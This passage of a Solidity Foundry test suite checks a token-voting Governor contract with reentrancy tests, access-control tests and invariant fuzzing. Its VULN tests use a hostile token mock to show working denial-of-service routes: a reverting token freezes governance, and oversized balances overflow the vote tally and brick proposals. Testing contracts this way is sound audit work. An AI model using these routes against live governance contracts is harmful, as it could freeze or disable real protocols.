        (ReentrantTarget t, uint256 id) = _reentrantSetup(ReentrantTarget.Mode.ObserveState, 0);
        _voteYes(id);
        _warpExecutable(id);
        gov.execute(id);
        assertEq(uint8(t.observed()), uint8(Governor.ProposalState.Executed));
    }

    /// balanceOf is reached via STATICCALL, so a hostile token cannot mutate governor state.
    function test_reentrancy_hostileTokenBalanceOfCannotMutateState() public {
        (HostileToken ht, Governor g) = _hostileGov();
        vm.prank(alice);
        g.propose(address(counter), _incData(), "one"); // id 1
        vm.prank(alice);
        g.vote(1, true);
        vm.prank(bob);
        g.vote(1, true);
        vm.warp(block.timestamp + 3 days + 2 days); // proposal 1 Succeeded
        vm.prank(alice);
        g.propose(address(counter), _incData(), "two"); // id 2

        ht.configure(HostileToken.Mode.ReenterExecute, g, 1);
        vm.prank(bob);
        g.vote(2, true); // would revert "REENTERED" if reentry succeeded

        assertEq(uint8(g.state(1)), uint8(Governor.ProposalState.Succeeded));
        assertEq(counter.n(), 0);

        ht.configure(HostileToken.Mode.Normal, g, 0);
        g.execute(1);
        assertEq(counter.n(), 1);
    }

    /*//////////////////////////////////////////////////////////////
                            HOSTILE TOKEN
    //////////////////////////////////////////////////////////////*/

    function _hostileGov() internal returns (HostileToken ht, Governor g) {
        ht = new HostileToken();
        g = new Governor(address(ht));
        ht.mint(alice, 60e18);
        ht.mint(bob, 50e18);
    }

    /// A reverting token freezes new proposals/votes forever (TOKEN is immutable) but cannot
    /// block execution of already-passed proposals.
    function test_VULN_revertingTokenFreezesGovernanceButNotExecution() public {
        (HostileToken ht, Governor g) = _hostileGov();
        vm.prank(alice);
        g.propose(address(counter), _incData(), "one");
        vm.prank(alice);
        g.vote(1, true);
        vm.prank(bob);
        g.vote(1, true);
        vm.warp(block.timestamp + 5 days);

        ht.configure(HostileToken.Mode.Reverting, g, 0);

        vm.expectRevert(bytes("hostile"));
        vm.prank(alice);
        g.propose(address(counter), "", "x");
        vm.expectRevert(bytes("hostile"));
        vm.prank(alice);
        g.vote(1, true);

        g.execute(1); // still works: never touches the token
        assertEq(counter.n(), 1);
    }

    /// Absurd balances overflow the tally -> voting DoS.
    function test_VULN_maxBalanceOverflowsVoteTally() public {
        (HostileToken ht, Governor g) = _hostileGov();
        ht.configure(HostileToken.Mode.MaxBalance, g, 0);
        vm.prank(alice);
        g.propose(address(counter), "", "x");
        vm.prank(alice);
        g.vote(1, true);
        vm.expectRevert(stdError.arithmeticError);
        vm.prank(bob);
        g.vote(1, true);
    }

    /// votesFor + votesAgainst overflow inside state() permanently bricks the proposal.
    function test_VULN_maxBalanceBricksStateAndExecute() public {
        (HostileToken ht, Governor g) = _hostileGov();
        ht.configure(HostileToken.Mode.MaxBalance, g, 0);
        vm.prank(alice);
        g.propose(address(counter), "", "x");
        vm.prank(alice);
        g.vote(1, true);
        vm.prank(bob);
        g.vote(1, false);
        vm.warp(block.timestamp + 3 days);

        vm.expectRevert(stdError.arithmeticError);
        g.state(1);
        vm.expectRevert(stdError.arithmeticError);
        g.execute(1);
    }

    /*//////////////////////////////////////////////////////////////
                             ACCESS CONTROL
    //////////////////////////////////////////////////////////////*/

    function test_access_noAdminSurface() public {
        string[6] memory sigs = [
            "setToken(address)",
            "owner()",
            "transferOwnership(address)",
            "cancel(uint256)",
            "setQuorum(uint256)",
            "upgradeTo(address)"
        ];
        for (uint256 i; i < sigs.length; i++) {
            (bool ok,) = address(gov).call(abi.encodeWithSignature(sigs[i], address(1)));
            assertFalse(ok, sigs[i]);
        }
        assertEq(gov.TOKEN(), address(token));
    }

    function test_access_rejectsPlainEther() public {
        vm.deal(alice, 1 ether);
        vm.prank(alice);
        (bool ok,) = address(gov).call{value: 1 ether}("");
        assertFalse(ok);
        assertEq(address(gov).balance, 0);
    }

    function test_access_zeroBalanceUserCapabilities() public {
        uint256 id = _propose(alice, address(counter), _incData());
        vm.startPrank(stranger);
        vm.expectRevert(bytes("You don't have enough power to propose"));
        gov.propose(address(counter), "", "x");
        vm.expectRevert(bytes("You don't have enough power to vote"));
        gov.vote(id, true);
        gov.state(id); // read-only calls are fine
        vm.stopPrank();
    }

    function test_access_proposerHasNoSpecialRightsOverProposal() public {
        uint256 id = _propose(alice, address(counter), _incData());
        // proposer is just another voter: no cancel, no veto, no extra weight
        _vote(alice, id, false);
        _vote(bob, id, true);
        _vote(carol, id, true);
        vm.warp(_end(id));
        assertEq(_votesFor(id), 90e18);
        assertEq(_votesAgainst(id), 60e18);
        // proposer voting against their own proposal can't veto it: 150 total >= quorum, 90 > 60
        _assertState(id, Governor.ProposalState.Queued);
    }

    function test_access_onlyGovernorModifierWorksViaGovernance() public {
        Vault v = new Vault(address(gov));
        vm.expectRevert(Vault.NotGovernor.selector);
        vm.prank(alice);
        v.setFee(5);

        uint256 id = _propose(alice, address(v), abi.encodeCall(Vault.setFee, (42)));
        _voteYes(id);
        _warpExecutable(id);
        gov.execute(id);
        assertEq(v.fee(), 42);
    }

    function test_access_selfCallCannotEscalate() public {
        // Proposal asking the Governor to call itself as `propose` fails: governor holds no tokens.
        uint256 id = _propose(alice, address(gov), abi.encodeCall(Governor.propose, (address(counter), "", "x")));
        _voteYes(id);
        _warpExecutable(id);
        vm.expectRevert(bytes("failed executing"));
        gov.execute(id);
    }
}

/*//////////////////////////////////////////////////////////////
                    STATEFUL / INVARIANT TESTING
//////////////////////////////////////////////////////////////*/

contract GovernorHandler is Test {
    Governor public gov;
    MockToken public token;
    address[] public actors;
    uint256 public created;
    mapping(uint256 => uint256) public ghostTally;

    constructor(Governor g, MockToken t, address[] memory a) {
        gov = g;
        token = t;
        for (uint256 i; i < a.length; i++) {
            actors.push(a[i]);
        }
    }

    function propose(uint256 seed) external {
        address a = actors[seed % actors.length];
        vm.prank(a);
        try gov.propose(address(this), "", "d") {
            created++;
        } catch {}
    }

    function vote(uint256 aSeed, uint256 idSeed, bool support) external {
        if (created == 0) return;
        address a = actors[aSeed % actors.length];
        uint256 id = bound(idSeed, 1, created);
        uint256 w = token.balanceOf(a);
        vm.prank(a);
        try gov.vote(id, support) {
            ghostTally[id] += w;
        } catch {}
    }

    function shuffle(uint256 fromSeed, uint256 toSeed, uint256 amt) external {
        address f = actors[fromSeed % actors.length];
        address t = actors[toSeed % actors.length];
        amt = bound(amt, 0, token.balanceOf(f));
        vm.prank(f);
        token.transfer(t, amt);
    }

    function warp(uint256 dt) external {
        vm.warp(block.timestamp + bound(dt, 0, 4 days));
    }
}

contract GovernorInvariantTest is Test {
    Governor internal gov;
    MockToken internal token;
    GovernorHandler internal handler;

    function setUp() public {
        vm.warp(1_000_000);
        token = new MockToken();
        gov = new Governor(address(token));

        address[] memory actors = new address[](4);
        for (uint256 i; i < 4; i++) {
            actors[i] = makeAddr(string.concat("actor", vm.toString(i)));
            token.mint(actors[i], (i + 1) * 40e18);
        }
        handler = new GovernorHandler(gov, token, actors);
        targetContract(address(handler));
    }

    function invariant_idCounterMatchesCreatedProposals() public {
        assertEq(gov.currentID(), handler.created() + 1);
    }

    /// votesFor + votesAgainst always equals the sum of balances read at each successful vote.
    function invariant_tallyEqualsRecordedWeights() public {
        for (uint256 i = 1; i <= handler.created(); i++) {
            (,,,,, uint256 f, uint256 a,,,) = gov.proposals(i);
            assertEq(f + a, handler.ghostTally(i));
        }
    }

    function invariant_proposalIdsSequentialAndFutureSlotsEmpty() public {
        for (uint256 i = 1; i <= handler.created(); i++) {
            (uint256 id,,,,,,,,,) = gov.proposals(i);
            assertEq(id, i);
        }
        (uint256 nextId, address nextProposer,,,,,,,,) = gov.proposals(handler.created() + 1);
        assertEq(nextId, 0);
        assertEq(nextProposer, address(0));
    }

    /// The handler never calls execute, so nothing may ever be marked executed.
    function invariant_nothingExecutedWithoutExecute() public {
        for (uint256 i = 1; i <= handler.created(); i++) {
            (,,,,,,,,, bool ex) = gov.proposals(i);
            assertFalse(ex);
        }
    }
}